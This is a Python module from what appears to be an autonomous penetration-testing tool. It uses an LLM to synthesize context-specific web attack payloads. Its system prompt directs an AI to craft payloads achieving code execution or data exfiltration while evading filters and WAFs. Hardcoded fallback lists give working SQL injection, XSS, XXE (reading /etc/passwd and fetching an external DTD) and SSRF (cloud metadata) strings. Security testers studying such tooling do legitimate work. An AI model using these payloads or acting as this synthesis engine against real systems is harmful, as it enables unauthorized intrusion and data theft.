"""
Context-aware payload synthesis via LLM.

Payloads are built for the exact reflection context (attribute / JS string /
event handler / filter state), not sprayed from a wordlist. The LLM generates
targeted payloads after analyzing how the application handles and reflects input.
"""
from __future__ import annotations

import json
from typing import Any

import structlog

from nightfall.ai.client import ModelClient

logger = structlog.get_logger(__name__)


# ── System Prompt for Payload Synthesis ──────────────────────────────────────

PAYLOAD_SYNTH_SYSTEM = """You are a payload synthesis engine for NIGHTFALL, an
autonomous penetration testing tool performing authorized security testing.

Given a reflection context (where and how user input appears in the response),
generate targeted payloads that are likely to achieve code execution or data
exfiltration in that specific context.

Rules:
1. Analyze the reflection context carefully: is the input in an HTML attribute,
   a JS string, an event handler, a URL parameter, an XML body, an HTTP header?
2. Generate payloads that break out of the current context and achieve execution.
3. Consider existing filters: if certain characters are stripped/encoded, craft
   payloads that avoid those characters.
4. If WAF bypass chains are provided, incorporate them into the payloads.
5. Return 3-8 payloads, ordered by likelihood of success (most likely first).
6. Each payload should be different in technique (not just character variations).
7. For SQL injection: consider the DBMS type if known.
8. For XSS: consider CSP headers if provided.

Output ONLY valid JSON:
{
  "analysis": "brief analysis of the reflection context and filter state",
  "payloads": [
    {
      "value": "the actual payload string",
      "technique": "context-break|encoding-bypass|polyglot|event-handler|...",
      "target_context": "html-attr|js-string|html-body|url-param|xml-body|...",
      "expected_signal": "reflection|execution|error|oob|timing",
      "notes": "why this payload should work in this context"
    }
  ]
}"""


async def synthesize_payloads(
    ai: ModelClient,
    vuln_class: str,
    context: dict[str, Any],
    frozen_waf_chain: str | None = None,
) -> list[dict]:
    """Generate context-aware payloads for a specific vulnerability class.

    Args:
        ai: ModelClient instance.
        vuln_class: The vulnerability class (sqli, xss, xxe, ssrf, etc.)
        context: Dict describing the reflection context, including:
            - reflection_point: where input appears in the response
            - surrounding_html: the HTML/JS around the reflection
            - filtered_chars: characters that are stripped/encoded
            - content_type: response content type
            - csp_header: Content-Security-Policy if present
            - dbms: detected DBMS type (for SQLi)
            - waf: detected WAF type
        frozen_waf_chain: Pre-computed WAF bypass encoding chain.

    Returns:
        List of payload dicts with value, technique, target_context, etc.
    """
    prompt = f"""VULNERABILITY CLASS: {vuln_class}

REFLECTION CONTEXT:
{json.dumps(context, indent=2, default=str)}

FROZEN WAF BYPASS CHAIN: {frozen_waf_chain or 'none'}

Generate targeted payloads for this exact context. Remember:
- Break out of the current reflection context
- Avoid filtered characters
- Use the WAF bypass chain if one is frozen
- Order by likelihood of success"""

    logger.info(
        "payload_synthesis_invoked",
        vuln_class=vuln_class,
        context_keys=list(context.keys()),
    )

    result = await ai.think(PAYLOAD_SYNTH_SYSTEM, prompt, temperature=0.3)

    if "error" in result and len(result) == 1:
        logger.error("payload_synthesis_error", error=result["error"][:200])
        return _fallback_payloads(vuln_class)

    payloads = result.get("payloads", [])
    if not payloads:
        logger.warning("payload_synthesis_empty", vuln_class=vuln_class)
        return _fallback_payloads(vuln_class)

    logger.info(
        "payload_synthesis_result",
        vuln_class=vuln_class,
        num_payloads=len(payloads),
        analysis=result.get("analysis", "")[:200],
    )

    return payloads


# ── Fallback Payloads (when LLM is unavailable) ─────────────────────────────

def _fallback_payloads(vuln_class: str) -> list[dict]:
    """Return deterministic fallback payloads when LLM synthesis fails."""

    FALLBACKS = {
        "sqli": [
            {"value": "' OR '1'='1", "technique": "classic-or", "target_context": "sql-string"},
            {"value": "1; SELECT SLEEP(5)--", "technique": "time-based", "target_context": "sql-numeric"},
            {"value": "' UNION SELECT NULL,NULL,NULL--", "technique": "union", "target_context": "sql-string"},
            {"value": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
             "technique": "error-extract", "target_context": "mysql"},
        ],
        "xss": [
            {"value": "<script>alert(1)</script>", "technique": "basic-script", "target_context": "html-body"},
            {"value": "\" onmouseover=\"alert(1)\" x=\"", "technique": "attr-break", "target_context": "html-attr"},
            {"value": "'-alert(1)-'", "technique": "js-break", "target_context": "js-string"},
            {"value": "<img src=x onerror=alert(1)>", "technique": "event-handler", "target_context": "html-body"},
            {"value": "javascript:alert(1)//", "technique": "proto-handler", "target_context": "url-attr"},
        ],
        "xxe": [
            {"value": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
             "technique": "basic-entity", "target_context": "xml-body"},
            {"value": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % ext SYSTEM "http://OAST/dtd">%ext;]><r/>',
             "technique": "param-entity-oob", "target_context": "xml-body"},
        ],
        "ssrf": [
            {"value": "http://169.254.169.254/latest/meta-data/", "technique": "aws-metadata", "target_context": "url-param"},
            {"value": "http://127.0.0.1:8080/admin", "technique": "loopback", "target_context": "url-param"},
            {"value": "http://[::1]/", "technique": "ipv6-loopback", "target_context": "url-param"},
        ],
    }

    return FALLBACKS.get(vuln_class, [
        {"value": "NIGHTFALL_TEST_PROBE", "technique": "marker", "target_context": "generic"},
    ])


# ── Context Analysis Helpers ─────────────────────────────────────────────────

def analyze_reflection_context(
    response_body: str,
    marker: str,
    response_headers: dict | None = None,
) -> dict[str, Any]:
    """Analyze how a marker is reflected in the response to determine context.

    Returns a dict describing the reflection environment for payload synthesis.
    """
    context: dict[str, Any] = {
        "reflected": marker in response_body if marker else False,
        "reflection_point": "none",
        "surrounding_html": "",
        "filtered_chars": [],
        "content_type": "",
        "csp_header": "",
    }

    if response_headers:
        context["content_type"] = response_headers.get("content-type", "")
        context["csp_header"] = response_headers.get("content-security-policy", "")

    if not marker or marker not in response_body:
        return context

    # Find reflection position and surrounding context
    pos = response_body.find(marker)
    start = max(0, pos - 300)
    end = min(len(response_body), pos + len(marker) + 300)
    surrounding = response_body[start:end]
    context["surrounding_html"] = surrounding

    # Determine reflection context
    before = response_body[max(0, pos - 100):pos].lower()

    if 'value="' in before or "value='" in before:
        context["reflection_point"] = "html-attribute-value"
    elif "<script" in before and "</script>" not in before:
        context["reflection_point"] = "js-string"
    elif "<!--" in before and "-->" not in before:
        context["reflection_point"] = "html-comment"
    elif "<style" in before and "</style>" not in before:
        context["reflection_point"] = "css-context"
    elif "href=" in before or "src=" in before or "action=" in before:
        context["reflection_point"] = "url-attribute"
    else:
        context["reflection_point"] = "html-body"

    # Detect filtered characters by checking what's missing
    test_chars = "<>\"'&;(){}[]|`"
    for ch in test_chars:
        if ch not in response_body:
            context["filtered_chars"].append(ch)

    return context
